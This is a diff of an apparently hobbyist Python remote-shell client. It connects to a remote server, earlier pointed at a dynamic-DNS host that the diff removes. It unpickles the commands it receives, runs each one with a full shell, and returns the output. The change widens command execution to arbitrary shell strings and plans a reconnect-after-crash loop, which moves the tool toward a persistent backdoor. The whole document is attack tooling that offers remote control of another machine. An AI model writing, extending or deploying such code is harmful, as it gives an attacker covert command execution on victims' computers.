@@ -12,9 +12,11 @@ import time
 
 #   2.  Fix command formatting and outputt formatting so it's airtight || Crappy
 
+#   3.  Waterproof loop, to re-establish a connection, even after a crash
+
 
 #Server properties
-IP = '' #    --> thanathos.hopto.org
+IP = '' #    --> 
 PORT = 9999
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP socket
 
@@ -29,25 +31,15 @@ def connect():
 
     return socket
 
-#   --> Function to receive a command, execute it and return the output
-def execute(command):
-    x = ""
-    command = command.split() #Split the command, bad solution
 
-    if command[0] == "cd":
-        try:
-            os.chdir(str(command[1]))
-        except Exception as e:
-            print(e)
-            time.sleep(10)
+#   --> Receive a command, execute it and return the result
+def popenExecution(data):
 
-    elif len(command) >= 2:
-        x = subprocess.check_output([str(command[0]), str(command[1])])
+    command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
+    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
-    else:
-        x = subprocess.check_output([str(command[0])])
-
-    return x
+    output = str(command.stdout.read() + command.stderr.read(), "utf-8")
+    return output
 
 
 #   --> Receive function, calls for a send function after receiving something
@@ -59,7 +51,7 @@ def recv():
             print("Waiting to receive something!")
             command = pickle.loads(socket.recv(4096))
             print("Got: ", command)
-            result = execute(command)
+            result = popenExecution(command)
         except socket.error as e:
             print(e)
             socket.close()
